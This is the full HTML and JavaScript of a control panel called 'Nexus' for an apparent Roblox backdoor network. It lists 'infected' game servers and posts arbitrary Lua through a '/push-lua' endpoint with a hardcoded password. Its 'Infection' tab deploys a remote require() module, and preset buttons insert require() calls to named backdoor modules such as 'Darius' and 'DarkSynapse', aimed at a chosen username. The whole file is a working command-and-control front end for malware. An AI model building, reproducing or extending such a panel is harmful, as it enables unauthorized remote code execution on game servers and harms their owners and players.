<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Nexus  | Final Build</title>
    <style>
        :root { --apple-blue: #0071e3; --bg: #000; }
        body { margin: 0; background: var(--bg); color: #fff; font-family: -apple-system, sans-serif; overflow: hidden; }
        .header { position: fixed; top: 0; width: 100%; height: 44px; background: rgba(0,0,0,0.8); backdrop-filter: blur(20px); border-bottom: 1px solid #333; display: flex; align-items: center; justify-content: space-between; padding: 0 20px; box-sizing: border-box; z-index: 1000; }
        .nav { display: flex; gap: 8px; }
        .nav-btn { background: none; border: none; color: #86868b; cursor: pointer; font-size: 10px; padding: 5px 7px; border-radius: 5px; text-transform: uppercase; }
        .nav-btn.active { color: #fff; background: rgba(255,255,255,0.1); font-weight: 600; }
        .container { display: flex; align-items: center; justify-content: center; height: 100vh; }
        .card { background: #1c1c1e; border-radius: 18px; width: 560px; padding: 25px; border: 1px solid #333; box-shadow: 0 10px 40px rgba(0,0,0,0.6); }
        h2 { margin: 0 0 12px 0; font-size: 18px; }
        input, textarea, select { width: 100%; border-radius: 8px; border: 1px solid #424245; background: #000; color: #fff; padding: 10px; margin-bottom: 10px; box-sizing: border-box; outline: none; font-size: 12px; }
        textarea { font-family: 'Courier New', monospace; resize: none; }
        .btn-main { background: var(--apple-blue); color: #fff; border: none; border-radius: 8px; padding: 12px; width: 100%; font-weight: 600; cursor: pointer; }
        .row-btns { display: flex; gap: 4px; margin-bottom: 10px; flex-wrap: wrap; }
        .rh-pill { background: #333; color: #fff; border: none; padding: 4px 10px; border-radius: 12px; font-size: 9px; cursor: pointer; }
        .status-bar { font-size: 10px; margin-bottom: 10px; padding: 8px; border-radius: 8px; background: rgba(255,59,48,0.1); color: #ff3b30; text-align: center; }
        .status-bar.found { background: rgba(52,199,89,0.1); color: #34c759; }
        .node-box { background: #0b0b0c; border-radius: 10px; height: 180px; overflow-y: auto; border: 1px solid #333; }
        .game-item { padding: 12px; border-bottom: 1px solid #333; display: flex; justify-content: space-between; align-items: center; }
        .join-btn { background: #fff; color: #000; text-decoration: none; font-size: 10px; font-weight: 800; padding: 6px 12px; border-radius: 12px; transition: 0.2s; }
        .music-ctrl { position: fixed; bottom: 20px; left: 20px; background: rgba(44,44,46,0.8); backdrop-filter: blur(10px); padding: 8px 15px; border-radius: 20px; border: 1px solid #444; display: flex; gap: 10px; z-index: 2000; }
    </style>
</head>
<body onclick="startAudio()">
    <audio id="bgMusic" loop src="https://cdn.discordapp.com/attachments/1459510270870421546/1492178549317308426/Wont_Stop_Us_-_StacyBurke92_g00byd0lan_KLICKAUD.mp3?ex=69da6311&is=69d91191&hm=f174788afceacbba804576a6c0e91386a5e3a077bacbedbc981032a8ec393a1c&"></audio>

    <div class="header">
        <div style="font-weight:700;"> NEXUS</div>
        <div class="nav">
            <button id="btn-mass" class="nav-btn active" onclick="showTab('mass')">Mass</button>
            <button id="btn-single" class="nav-btn" onclick="showTab('single')">Single</button>
            <button id="btn-inf" class="nav-btn" onclick="showTab('inf')">Infection</button>
            <button id="btn-wl" class="nav-btn" onclick="showTab('wl')">Whitelist</button>
            <button id="btn-nodes" class="nav-btn" onclick="showTab('nodes')">Games</button>
        </div>
    </div>

    <div class="container">
        <div class="card">
            <div id="mass" class="tab-content">
                <h2>Mass Execution</h2>
                <div class="row-btns">
                    <button class="rh-pill" onclick="fillRH(1, 'm_lua')">Last Rig</button>
                    <button class="rh-pill" onclick="fillRH(2, 'm_lua')">Require.EXE</button>
                    <button class="rh-pill" onclick="fillRH(3, 'm_lua')">Darius</button>
                    <button class="rh-pill" onclick="fillRH('R6', 'm_lua')">R6</button>
                    <button class="rh-pill" onclick="fillRH('DS', 'm_lua')">DarkSynapse</button>
                    <button class="rh-pill" onclick="fillRH('Steve', 'm_lua')">Steve</button>
                </div>
                <textarea id="m_lua" rows="7" placeholder="-- Global Lua"></textarea>
                <button class="btn-main" onclick="send('mass')">Execute All</button>
            </div>

            <div id="single" class="tab-content" style="display:none;">
                <h2>Single Execution</h2>
                <div id="target-status" class="status-bar">Join the infected game</div>
                <div class="row-btns">
                    <button class="rh-pill" onclick="fillRH(1, 's_lua')">Last Rig</button>
                    <button class="rh-pill" onclick="fillRH(2, 's_lua')">Require.EXE</button>
                    <button class="rh-pill" onclick="fillRH(3, 's_lua')">Darius</button>
                    <button class="rh-pill" onclick="fillRH('R6', 's_lua')">R6</button>
                    <button class="rh-pill" onclick="fillRH('DS', 's_lua')">DarkSynapse</button>
                    <button class="rh-pill" onclick="fillRH('Steve', 's_lua')">Steve</button>
                </div>
                <select id="target_id" disabled><option value="">Auto-Scanning...</option></select>
                <textarea id="s_lua" rows="5" placeholder="-- Target Lua"></textarea>
                <button class="btn-main" onclick="send('single')">Execute Target</button>
            </div>

            <div id="wl" class="tab-content" style="display:none;">
                <h2>Whitelist</h2>
                <input type="text" id="wid" placeholder="Enter Full Roblox Username">
                <button class="btn-main" onclick="saveWl()">Save & Start Tracking</button>
                <p id="save-msg" style="font-size: 10px; color: #34c759; margin-top: 5px; display: none;">Tracking active!</p>
            </div>

            <div id="nodes" class="tab-content" style="display:none;">
                <h2>Active Games</h2>
                <div id="node_list" class="node-box"></div>
            </div>
            
            <div id="inf" class="tab-content" style="display:none;">
                <h2>Infection</h2>
                <textarea id="i_lua" rows="8">require(127445614272366).op("Darius")</textarea>
                <button class="btn-main" onclick="send('inf')">Deploy</button>
            </div>
        </div>
    </div>

    <div class="music-ctrl">
        <button id="pBtn" style="background:#fff; border:none; border-radius:15px; font-size:10px; font-weight:bold; padding:5px 12px;" onclick="toggle()">PAUSE</button>
        <button style="background:#ff3b30; color:#fff; border:none; border-radius:15px; font-size:10px; font-weight:bold; padding:5px 12px;" onclick="stopMusic()">STOP</button>
    </div>

    <script>
        const audio = document.getElementById('bgMusic');
        let currentNodes = {};
        let detectedJobId = null;

        function startAudio() { if(audio.paused && audio.src !== "") audio.play().catch(()=>{}); }
        function toggle() { audio.paused ? audio.play() : audio.pause(); }
        function stopMusic() { audio.pause(); audio.src=""; document.querySelector('.music-ctrl').style.display='none'; }

        function showTab(id) {
            document.querySelectorAll('.tab-content').forEach(t => t.style.display = 'none');
            document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
            document.getElementById(id).style.display = 'block';
            document.getElementById('btn-' + id).classList.add('active');
        }

        function saveWl() {
            document.getElementById('save-msg').style.display = 'block';
            autoScan();
            setTimeout(() => { document.getElementById('save-msg').style.display = 'none'; }, 2000);
        }

        function fillRH(type, boxId) {
            const user = document.getElementById('wid').value || "Player";
            const box = document.getElementById(boxId);
            if(type === 1) box.value = `require(132155655397653)("${user}")`;
            if(type === 2) box.value = `require(125992639027440)["Require.EXE by E God"]("${user}")`;
            if(type === 3) box.value = `require(127445614272366).op("${user}")`;
            if(type === 'R6') box.value = `require(3436957371):r6("${user}")`;
            if(type === 'DS') box.value = `require(133245855072069)("${user}", "DarkSynapse")`;
            if(type === 'Steve') box.value = `require(12246001294):Blockify("${user}")`;
        }

        function autoScan() {
            const name = document.getElementById('wid').value.toLowerCase();
            const status = document.getElementById('target-status');
            const select = document.getElementById('target_id');
            if(!name) return;

            detectedJobId = null;
            for (let k in currentNodes) {
                if (currentNodes[k].players && currentNodes[k].players.some(p => p.toLowerCase() === name)) {
                    detectedJobId = k; break;
                }
            }

            if(detectedJobId) {
                status.innerText = "PLAYER DETECTED: " + currentNodes[detectedJobId].name;
                status.className = "status-bar found";
                select.innerHTML = `<option value="${detectedJobId}">${currentNodes[detectedJobId].name}</option>`;
            } else {
                status.innerText = "Join the infected game";
                status.className = "status-bar";
                select.innerHTML = `<option value="">Searching for you...</option>`;
            }
        }

        async function update() {
            try {
                const res = await fetch('/get-games');
                currentNodes = await res.json();
                autoScan();
                const keys = Object.keys(currentNodes);
                document.getElementById('node_list').innerHTML = keys.map(k => `
                    <div class="game-item">
                        <div>
                            <b style="font-size:12px;">${currentNodes[k].name}</b><br>
                            <small style="color:#666; font-size:9px;">${k}</small><br>
                            <small style="color:var(--apple-blue); font-size:9px;">Players: ${currentNodes[k].players ? currentNodes[k].players.length : 0}</small>
                        </div>
                        <a class="join-btn" href="roblox://placeId=${currentNodes[k].placeId}&gameInstanceId=${k}">JOIN</a>
                    </div>`).join('') || '<div style="padding:20px; text-align:center;">No Nodes Online</div>';
            } catch(e) {}
        }

        async function send(tabId) {
            const lua = document.querySelector(`#${tabId} textarea`).value;
            const tid = tabId === 'single' ? detectedJobId : null;
            if(tabId === 'single' && !tid) return alert("Error: Join the infected game");
            await fetch('/push-lua', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({lua, password:"Alt", targetId:tid})});
            alert("Payload Sent");
        }

        setInterval(update, 5000);
        window.onload = () => { showTab('mass'); update(); };
    </script>
</body>
</html>
